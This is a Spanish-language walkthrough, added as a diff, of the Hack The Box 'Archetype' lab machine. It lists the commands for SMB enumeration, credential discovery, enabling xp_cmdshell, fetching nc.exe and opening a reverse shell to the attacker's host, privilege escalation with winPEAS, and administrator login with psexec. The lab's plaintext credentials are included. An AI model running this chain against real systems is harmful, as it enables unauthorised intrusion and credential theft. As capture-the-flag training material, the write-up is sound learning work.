@@ -1,0 +1,60 @@
+HACK THE BOX - ARCHETYPE MACHINE
+
+- sudo nmap -sC -sV -sS 10.129.242.95																										-Nmap para escaneo de puertos en la Maquina a vulnerar
+
+			- Se encontraron principalmente 4 puertos abiertos de los cuales 2 presentaban posibles vulnerabilidades (445 corriendo SMB - 1433 corriendo Microsft SQL Server 2017)
+			
+- smbclient -N -L \\\\10.129.242.95\\																										-Conectamos con el cliente SMB y verificamos los directorios diponibles (-L) (-N para NON Password), verificando 4 posibles rutas de las cuales 3 eran con privilegios ($) y uno libre al cual procedemos a verificar su contenido
+- smbclient -N  \\\\10.129.242.95\\backups																									-Nos conectamos al directorio disponible y verificamos el contenido, del cual obtenemos las credenciales "Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc" que utilizaremos para la conexión al servidor SQL
+
+			- A través del uso de mssqlclient.py con impacket, Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC)
+
+- locate mssqclient.py																														-Localizamos la ubicación del script para ejecutarlo desde su ruta, utilizando las credenciales anteriormente obtenidas 
+- sudo python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE\sql_svc@10.129.242.95										-Con el formato  python3 ~\mssqlclient.py [Domin]/[UserID]@[IP_ADDRESS] conectamos al servidor SQL, posterior a ejectuar el comando nos pedira PASSWORD el cual colocamos segun las credenciales
+
+			- Dentro del servidor SQL ejecutaremos el shell CMD, para el cual tenemos que verificar si se encuentra habilitado y sino habilitarlo, para poder utilizar el shell para ejecutar comandos
+			
+- enable_xp_cmdshell																														-Habilitamos CMDshell
+- RECONFIGURE																																-Parte del comando de habilitación de xp_cmdshell
+- xp_cmdshell "powershell -c pwd"																											-Verificamos que se encuentre habilitado ejectuando el comando "powershell -c pwd", el cual a través de powershell deberia mostrarnos el directorio en el que nos encontramos actualmente
+
+			-Una vez dentro del directorio buscamos las flags, una en C:\Users\sql_svc\Desktop\ y la otra en C:\Users\Administrator\Desktop\ 
+			
+- xp_cmdshell "powershell -c Get-ChildItem C:\Users\sql_svc\Desktop\"																		-Con el comando Get-ChildItem listamos los archivos y directorios presentes en directorio especificado, si solo se quiere listar directorios se añade "-Directory". En el mismo encontramos "user.txt" el cual verificamos
+- xp_cmdshell "powershell -c Get-Content C:\Users\sql_svc\Desktop\user.txt"																	-Con el comando Get-Content Mostramos el contenido del archivo especificado "user.txt" obteniendo el primer flag
+
+			-Posteriormente tratamos de acceder a la segunda ruta en C:\Administrator\Desktop\, pero es una ruta que requiere de privilegios, por lo tanto buscaremos una forma de escalar nuestros privilegios para poder acceder.
+			-Antes de eso estableceremos una "Reverse Shell Connection" para mayor comodidad en la ejecución de comandos, para eso tenemos que copiar el archivo "nc.exe" hacia nuestro directorio de trabajo "~\Hacking\HackTheBox\Archetype".
+			
+- cd ~\Hacking\HackTheBox\Archetype																											-Nos colocamos en nuestra directorio de trabajo y en donde se debe encontrar el archivo "nc.exe" que permitirá establacer la "Reverse Shell Connection"
+- sudo python3 -m http.server 80																											-Iniciamos un servidor web a través del puerto 80 en el directorio actual "~\Hacking\HackTheBox\Archetype"		
+- sudo nc -lvnp 443																															-Con el comando nc (netcat) creamos un servidor que escucha conexiones entrantes en el puerto 443, proporcionando una forma de recibir y manejar datos de forma segura a través de esa conexión.
+
+			-Una vez establecido nuestro Servidor y Listener procedemos con la Reverse Shell Connection desde el servidor SQL
+
+- ifconfig																																	-Verificamos a traves de que dirección IP establecimos nuestro servidor (Comunmente Tun0: 10.10.14.195)
+- xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads\; wget http://10.10.14.195/nc.exe -outfile nc.exe"								-Con el comando nos dirigimos al directorio "Downloads" en el cual y con el comando wget, realizamos una petición al servidor web anteriormente configurado y descargamos el archivo nc.exe
+- xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads\; .\nc.exe -e cmd.exe 10.10.14.195 443"											-Con el comando nos dirigimos al directorio donde se encuentra nuestro archivo "nc.exe" y lo ejecutamos (.\nc.exe) con el parametró (-e cmd.exe) que se utiliza para especificar el comando que se ejecutará después de establecer la conexión. Ademas especificamos la dirección IP y puerto a través del cual nos conectaremos.
+
+			-Ahora establecida una RSC, y para poder acceder a la ruta con privilegios, haremos uso del script winPEAS, el cual descargamos desde github y copiamos en el directorio de trabajo y donde se encuentra nuestro servidor web 
+			
+- xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads\; wget http://10.10.14.195/winPEASx64.exe -outfile winPEASx64.exe"					-Con el comando descargamos winPEAS.exe en el directorio ~\Downloads\
+- xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads\; .\winPEASx64.exe -e winPEASx64.exe"												-Con el comando ejectuamos el Script de Winpeas para descubrimiento y escalar privilegios, dentro de los resultados verificamos lo siguiente:
+
+			-����������͹ Analyzing Windows Files Files (limit 70)																				-La salida resaltada en rojo nos da la ruta de un archivo.txt con posibles credenciales de administrador, el cual verificaremos.
+			-C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+			
+	(Dentro del CMD del Reverse Shell Connection)		
+- type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt											-Con el comando "type" mostramos el contenido del documento "ConsoleHost_history.txt" dentro del cual encontramos las credenciales de administrador (user:administrator:MEGACORP_4dm1n!!)
+
+			-Como encontramos ya las credenciales de Administrador, procederemos a conectarnos al servidor desde un metodo Powershell (psexec.py) al igual que con (mssqlclient.py)
+			
+- sudo python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.129.242.95													-Usando psexec.py nos conectamos [userID]@[IP_ADDRESS], luego nos pedira la contraseña, la cual obtuvimos anteriormente "MEGACORP_4dm1n!!", y al fin establecemos una conexión con privilegios de administrador
+
+	( CMD establecida con psexec.py)
+
+- cd C:\Users\Administrator\Desktop\																											-Vamos a la dirección en la que se encuentra el segundo FLAG
+- dir																																			-Mostramos los archivos y contenido del directorio
+- type root.txt																																	-Mostramos el contenido del archivo "root.txt" con el segundo FLAG
+
+		MAQUINA TERMINADA
